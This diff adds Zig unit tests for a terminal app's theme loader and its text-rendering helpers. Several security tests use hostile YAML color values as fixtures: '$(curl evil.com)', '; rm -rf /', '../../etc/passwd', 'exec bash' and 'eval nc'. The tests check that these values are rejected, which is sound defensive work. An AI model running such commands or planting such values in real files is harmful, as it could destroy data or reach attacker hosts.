@@ -664,3 +664,366 @@ pub fn writeShortcutWithHighlight(terminal: *Terminal, x: u16, y: u16, before: [
     try terminal.writeAll(after);
     try terminal.writeAll(reset);
 }
+
+const testing = std.testing;
+
+// --- tests from tests/model/theme_loader_test.zig ---
+
+test "default theme loads successfully" {
+    const allocator = testing.allocator;
+
+    var theme = try defaultTheme(allocator);
+    defer deinitTheme(&theme);
+
+    // Verify all color fields are allocated and non-empty
+    try testing.expect(theme.main_bg.len > 0);
+    try testing.expect(theme.main_fg.len > 0);
+    try testing.expect(theme.title.len > 0);
+    try testing.expect(theme.hi_fg.len > 0);
+    try testing.expect(theme.selected_bg.len > 0);
+    try testing.expect(theme.selected_fg.len > 0);
+    try testing.expect(theme.proc_box.len > 0);
+    try testing.expect(theme.div_line.len > 0);
+}
+
+test "load tokyo-night skin" {
+    const allocator = testing.allocator;
+
+    var theme = try loadTheme(allocator, "tokyo-night");
+    defer deinitTheme(&theme);
+
+    // Verify theme loaded
+    try testing.expect(theme.main_fg.len > 0);
+    try testing.expect(theme.hi_fg.len > 0);
+}
+
+test "load non-existent skin falls back to default" {
+    const allocator = testing.allocator;
+
+    var theme = try loadTheme(allocator, "nonexistent-theme-12345");
+    defer deinitTheme(&theme);
+
+    // Should load default theme without error
+    try testing.expect(theme.main_fg.len > 0);
+}
+
+test "deinitTheme frees all allocations" {
+    const allocator = testing.allocator;
+
+    var theme = try defaultTheme(allocator);
+    deinitTheme(&theme);
+
+    // If there were leaks, the testing allocator would catch them
+}
+
+// --- tests from tests/model/theme_security_test.zig ---
+
+// `parseSkinFile`/`isSafeColorValue` are private in this file.
+// The supported public entry point that exercises the same parse + safety
+// validation is `loadThemeFromDir(allocator, theme_name, dir_path)`, which reads
+// `<theme_name>.yaml` from `dir_path` and parses it. Each test writes its YAML
+// fixture into a temp dir and loads it through that path. `testing.tmpDir`
+// creates `.zig-cache/tmp/<sub_path>` relative to cwd (std.Io.Dir.realpathAlloc
+// was removed in 0.16), so we build the relative dir path from `sub_path`.
+
+/// Writes `content` as `skin.yaml` into a fresh temp dir and loads it through
+/// the public `loadThemeFromDir` path. Caller owns the returned theme and the
+/// returned `dir_path`; both must be cleaned up alongside `tmp_dir`.
+fn loadFromContent(
+    allocator: std.mem.Allocator,
+    tmp_dir: *testing.TmpDir,
+    content: []const u8,
+) !ThemeColors {
+    try tmp_dir.dir.writeFile(std.testing.io, .{ .sub_path = "skin.yaml", .data = content });
+
+    const dir_path = try std.fmt.allocPrint(
+        allocator,
+        ".zig-cache/tmp/{s}",
+        .{tmp_dir.sub_path},
+    );
+    defer allocator.free(dir_path);
+
+    return loadThemeFromDir(allocator, "skin", dir_path);
+}
+
+test "theme loader rejects malicious shell commands" {
+    const allocator = testing.allocator;
+
+    var tmp_dir = testing.tmpDir(.{});
+    defer tmp_dir.cleanup();
+
+    // Test malicious YAML with command injection
+    const malicious_yaml =
+        \\k9s:
+        \\  body:
+        \\    fgColor: "$(curl evil.com)"
+        \\    bgColor: "#414868; rm -rf /"
+    ;
+
+    var theme = try loadFromContent(allocator, &tmp_dir, malicious_yaml);
+    defer deinitTheme(&theme);
+
+    // Should fall back to default colors (not execute commands)
+    // The unsafe values should be ignored
+}
+
+test "theme loader rejects path traversal" {
+    const allocator = testing.allocator;
+
+    var tmp_dir = testing.tmpDir(.{});
+    defer tmp_dir.cleanup();
+
+    const malicious_yaml =
+        \\k9s:
+        \\  body:
+        \\    fgColor: "../../etc/passwd"
+        \\    bgColor: "~/malicious"
+    ;
+
+    var theme = try loadFromContent(allocator, &tmp_dir, malicious_yaml);
+    defer deinitTheme(&theme);
+}
+
+test "theme loader rejects command characters" {
+    const allocator = testing.allocator;
+
+    var tmp_dir = testing.tmpDir(.{});
+    defer tmp_dir.cleanup();
+
+    const malicious_yaml =
+        \\k9s:
+        \\  body:
+        \\    fgColor: "#fff|ls"
+        \\    bgColor: "#000;id"
+    ;
+
+    var theme = try loadFromContent(allocator, &tmp_dir, malicious_yaml);
+    defer deinitTheme(&theme);
+}
+
+test "theme loader rejects dangerous commands" {
+    const allocator = testing.allocator;
+
+    var tmp_dir = testing.tmpDir(.{});
+    defer tmp_dir.cleanup();
+
+    const malicious_yaml =
+        \\k9s:
+        \\  body:
+        \\    fgColor: "exec bash"
+        \\    bgColor: "eval nc"
+    ;
+
+    var theme = try loadFromContent(allocator, &tmp_dir, malicious_yaml);
+    defer deinitTheme(&theme);
+}
+
+test "theme loader accepts valid hex colors" {
+    const allocator = testing.allocator;
+
+    var tmp_dir = testing.tmpDir(.{});
+    defer tmp_dir.cleanup();
+
+    const valid_yaml =
+        \\k9s:
+        \\  body:
+        \\    fgColor: "#ffffff"
+        \\    bgColor: "#000000"
+    ;
+
+    var theme = try loadFromContent(allocator, &tmp_dir, valid_yaml);
+    defer deinitTheme(&theme);
+
+    // Should accept these valid hex colors
+}
+
+test "theme loader accepts valid named colors" {
+    const allocator = testing.allocator;
+
+    var tmp_dir = testing.tmpDir(.{});
+    defer tmp_dir.cleanup();
+
+    const valid_yaml =
+        \\k9s:
+        \\  body:
+        \\    fgColor: "white"
+        \\    bgColor: "black"
+    ;
+
+    var theme = try loadFromContent(allocator, &tmp_dir, valid_yaml);
+    defer deinitTheme(&theme);
+}
+
+test "theme loader accepts valid color aliases" {
+    const allocator = testing.allocator;
+
+    var tmp_dir = testing.tmpDir(.{});
+    defer tmp_dir.cleanup();
+
+    const valid_yaml =
+        \\k9s:
+        \\  body:
+        \\    fgColor: "*primary-color"
+        \\    bgColor: "*bg-dark"
+    ;
+
+    var theme = try loadFromContent(allocator, &tmp_dir, valid_yaml);
+    defer deinitTheme(&theme);
+}
+
+test "theme loader accepts default color" {
+    const allocator = testing.allocator;
+
+    var tmp_dir = testing.tmpDir(.{});
+    defer tmp_dir.cleanup();
+
+    const valid_yaml =
+        \\k9s:
+        \\  body:
+        \\    fgColor: "default"
+        \\    bgColor: "default"
+    ;
+
+    var theme = try loadFromContent(allocator, &tmp_dir, valid_yaml);
+    defer deinitTheme(&theme);
+}
+
+test "theme loader rejects oversized files" {
+    const allocator = testing.allocator;
+
+    var tmp_dir = testing.tmpDir(.{});
+    defer tmp_dir.cleanup();
+
+    // Create a buffer larger than 100KB
+    const large_content = try allocator.alloc(u8, 101 * 1024);
+    defer allocator.free(large_content);
+    @memset(large_content, 'x');
+
+    var theme = try loadFromContent(allocator, &tmp_dir, large_content);
+    defer deinitTheme(&theme);
+
+    // Should fall back to default theme
+}
+
+test "theme loader handles empty values safely" {
+    const allocator = testing.allocator;
+
+    var tmp_dir = testing.tmpDir(.{});
+    defer tmp_dir.cleanup();
+
+    const yaml_with_empty =
+        \\k9s:
+        \\  body:
+        \\    fgColor: ""
+        \\    bgColor: ""
+    ;
+
+    var theme = try loadFromContent(allocator, &tmp_dir, yaml_with_empty);
+    defer deinitTheme(&theme);
+}
+
+// --- tests from tests/theme_test.zig (rendering functions) ---
+
+// Test color constants
+const test_fg = "\x1b[38;2;207;201;194m";
+const test_bg = "\x1b[49m";
+const test_hi = "\x1b[38;2;247;118;142m";
+
+test "theme: writeStringWithTheme with empty text" {
+    var gpa = std.heap.DebugAllocator(.{}){};
+    defer _ = gpa.deinit();
+    const allocator = gpa.allocator();
+
+    var terminal = try Terminal.init(allocator);
+    defer terminal.deinit();
+
+    // Should not crash with empty text
+    try writeStringWithTheme(&terminal, 0, 0, "", test_fg, test_bg);
+}
+
+test "theme: writeStringWithTheme with very long text" {
+    var gpa = std.heap.DebugAllocator(.{}){};
+    defer _ = gpa.deinit();
+    const allocator = gpa.allocator();
+
+    var terminal = try Terminal.init(allocator);
+    defer terminal.deinit();
+
+    // Create very long text that would exceed buffer
+    var long_text: [2048]u8 = undefined;
+    @memset(&long_text, 'A');
+
+    // Should truncate and not crash
+    try writeStringWithTheme(&terminal, 0, 0, &long_text, test_fg, test_bg);
+}
+
+test "theme: writeStringWithTheme with normal text" {
+    var gpa = std.heap.DebugAllocator(.{}){};
+    defer _ = gpa.deinit();
+    const allocator = gpa.allocator();
+
+    var terminal = try Terminal.init(allocator);
+    defer terminal.deinit();
+
+    // Should work fine with normal text
+    try writeStringWithTheme(&terminal, 0, 0, "Hello, World!", test_fg, test_bg);
+}
+
+test "theme: writeStringWithTheme with special characters" {
+    var gpa = std.heap.DebugAllocator(.{}){};
+    defer _ = gpa.deinit();
+    const allocator = gpa.allocator();
+
+    var terminal = try Terminal.init(allocator);
+    defer terminal.deinit();
+
+    // Should handle special characters
+    try writeStringWithTheme(&terminal, 0, 0, "<ctrl-d>", test_fg, test_bg);
+    try writeStringWithTheme(&terminal, 0, 0, "│─┤", test_fg, test_bg);
+}
+
+test "theme: writeShortcutWithHighlight with empty strings" {
+    var gpa = std.heap.DebugAllocator(.{}){};
+    defer _ = gpa.deinit();
+    const allocator = gpa.allocator();
+
+    var terminal = try Terminal.init(allocator);
+    defer terminal.deinit();
+
+    // Should not crash with empty strings
+    try writeShortcutWithHighlight(&terminal, 0, 0, "", "", "", test_hi);
+}
+
+test "theme: writeShortcutWithHighlight with normal text" {
+    var gpa = std.heap.DebugAllocator(.{}){};
+    defer _ = gpa.deinit();
+    const allocator = gpa.allocator();
+
+    var terminal = try Terminal.init(allocator);
+    defer terminal.deinit();
+
+    // Should work fine with normal text
+    try writeShortcutWithHighlight(&terminal, 0, 0, "", "a", "ttach", test_hi);
+    try writeShortcutWithHighlight(&terminal, 0, 0, "sh", "o", "w node", test_hi);
+}
+
+test "theme: buffer size limits" {
+    var gpa = std.heap.DebugAllocator(.{}){};
+    defer _ = gpa.deinit();
+    const allocator = gpa.allocator();
+
+    var terminal = try Terminal.init(allocator);
+    defer terminal.deinit();
+
+    // Test with text that approaches buffer limit
+    var medium_text: [500]u8 = undefined;
+    @memset(&medium_text, 'B');
+
+    try writeStringWithTheme(&terminal, 0, 0, &medium_text, test_fg, test_bg);
+
+    // Test with text that exceeds buffer limit
+    var huge_text: [5000]u8 = undefined;
+    @memset(&huge_text, 'C');
+
+    try writeStringWithTheme(&terminal, 0, 0, &huge_text, test_fg, test_bg);
+}
